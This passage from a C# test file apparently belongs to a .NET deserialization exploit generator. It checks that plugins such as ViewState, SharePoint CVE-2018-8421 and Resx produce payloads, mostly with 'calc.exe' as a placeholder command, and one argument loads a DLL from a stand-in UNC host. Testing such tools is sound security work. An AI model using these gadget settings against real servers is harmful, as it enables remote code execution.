                { "MachineKeySessionSecurityTokenHandler", new string[] { "-c", "calc.exe", "--validationkey", valKey, "--decryptionkey", decKey } },
                { "NetNonRceGadgets", new string[] { "-g", "PictureBox", "-f", "Json.NET", "-i", "http://localhost/y" } },
                { "Resx", new string[] { "-M", "BinaryFormatter", "-c", "calc.exe" } },
                { "SessionSecurityTokenHandler", new string[] { "-c", "calc.exe" } },
                { "SharePoint", new string[] { "--cve", "CVE-2018-8421", "-c", "calc.exe" } },
                { "ThirdPartyGadgets", new string[] { "-g", "UnmanagedLibrary", "-f", "Json.NET", "-i", "\\\\host\\a.dll" } },
                { "TransactionManagerReenlist", new string[] { "-c", "calc.exe" } },
                { "ViewState", new string[] { "--dryrun", "--validationkey", valKey } },
            };

            // Not generated here, each with the reason. Keeping this explicit forces a
            // new plugin to be classified (see the coverage guard below).
            var excluded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "ActivatorUrl", "makes a live remoting/network call and returns a status string, not a payload" },
                { "Clipboard", "writes the OS clipboard on an STA thread; covered by dedicated clipboard tests" },
                { "Generic", "base plugin type, not a real plugin" },
            };

            try
            {
                foreach (KeyValuePair<string, string[]> kv in argvByPlugin)
                {
                    RunResult r = PayloadRunner.RunPlugin(kv.Key, kv.Value);
                    AssertTrue(r.Success, "plugin " + kv.Key + " runs: " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), "plugin " + kv.Key + " produced a non-empty payload");
                }

                // Coverage guard: every discovered plugin is generated or excluded.
                foreach (string name in PluginHelper.GetAllPluginNames())
                {
                    bool known = argvByPlugin.ContainsKey(name) || excluded.ContainsKey(name);
                    AssertTrue(known, "plugin " + name + " has no generation test and no explicit exclusion (add one)");
                }
            }
            finally
            {
                try { File.Delete(innerFixture); } catch { }
            }
        }

        // ---- helpers -----------------------------------------------------------

        // Drive the wizard with a scripted key source and return the bytes written
        // to the stdout stream. Captured stderr (prompts, menus, echo) is returned
        // too. All input (menus and free text) comes through the key reader.
        private static byte[] DriveWizard(IKeyReader keys, out string stderr)
        {
            var payload = new MemoryStream();
            TextWriter savedErr = Console.Error;
            StringWriter err = new StringWriter();
            Console.SetError(err);
            ModuleEditor.ForceFallback = true; // drive the deterministic single-panel path
            try
            {
                Wizard w = new Wizard(keys, payload);
                w.Run();
            }
            finally
            {
                Console.SetError(savedErr);
            }
            stderr = err.ToString();
            return payload.ToArray();
        }

        // Run an interactive widget while swallowing its stderr rendering.
        private static T WithSwallowedError<T>(Func<T> action)
        {
            TextWriter savedErr = Console.Error;
            Console.SetError(new StringWriter());
            try { return action(); }
            finally { Console.SetError(savedErr); }
        }


        private static byte[] GenerateOdpJson(string cmd)
        {
            return GenerateOdpJson(cmd, false);
        }

        private static byte[] GenerateOdpJson(string cmd, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Minify = minify;
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = "ObjectDataProvider";
            req.FormatterName = "Json.NET";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            if (!r.Success)
                throw new Exception("core generation failed: " + r.ErrorMessage);
            int len;
            return PayloadRunner.Encode(r.Raw, r.EffectiveOutputFormat, out len);
        }

        private static OptionField FindField(List<OptionField> fields, string name)
        {
            foreach (OptionField f in fields)
                if (string.Equals(f.Name, name, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static bool BytesEqual(byte[] a, byte[] b)
        {
            if (a == null || b == null) return a == b;
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++)
                if (a[i] != b[i]) return false;
            return true;
        }

        private static void Run(string name, Action test)
        {
            try
            {
                test();
                _passed++;
                Console.Error.WriteLine("[PASS] " + name);
            }
            catch (Exception e)
            {
                _failed++;
                Console.Error.WriteLine("[FAIL] " + name + " -> " + e.Message);
            }
        }

        private static void AssertTrue(bool cond, string msg)
        {
            if (!cond)
                throw new Exception("expected true: " + msg);
        }

        private static void AssertEqual(object expected, object actual, string msg)
        {
            if (!object.Equals(expected, actual))
                throw new Exception(msg + " (expected '" + expected + "', got '" + actual + "')");
        }
    }

    // A scripted key source so menu and picker logic can be driven without a
    // terminal. Throws if it runs dry, so a wrong script fails fast instead of
    // hanging.
    internal class ScriptedKeyReader : IKeyReader
    {
        private readonly Queue<ConsoleKeyInfo> _keys = new Queue<ConsoleKeyInfo>();

        public ScriptedKeyReader Type(string text)
        {
            foreach (char c in text)
                _keys.Enqueue(new ConsoleKeyInfo(c, ConsoleKey.A, false, false, false));
            return this;
        }

        // Type a line and press Enter (for a free-text prompt).
        public ScriptedKeyReader TypeLine(string text)
        {
            Type(text);
            return Enter();
        }

        public ScriptedKeyReader Enter()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\r', ConsoleKey.Enter, false, false, false));
            return this;
        }

        public ScriptedKeyReader Down()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.DownArrow, false, false, false));
            return this;
        }

        public ScriptedKeyReader Up()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.UpArrow, false, false, false));
            return this;
        }

        public ScriptedKeyReader Home()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.Home, false, false, false));
            return this;
        }

        public ScriptedKeyReader End()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.End, false, false, false));
            return this;
        }

        public ScriptedKeyReader Escape()
        {
            _keys.Enqueue(new ConsoleKeyInfo((char)27, ConsoleKey.Escape, false, false, false));
            return this;
        }

        public ScriptedKeyReader Digit(int n)
        {
            char c = (char)('0' + n);
            ConsoleKey k = (ConsoleKey)((int)ConsoleKey.D0 + n);
            _keys.Enqueue(new ConsoleKeyInfo(c, k, false, false, false));
            return this;
        }

        public ConsoleKeyInfo ReadKey()
        {
            if (_keys.Count == 0)
                throw new InvalidOperationException("scripted key source is empty");
            return _keys.Dequeue();
        }
    }
}
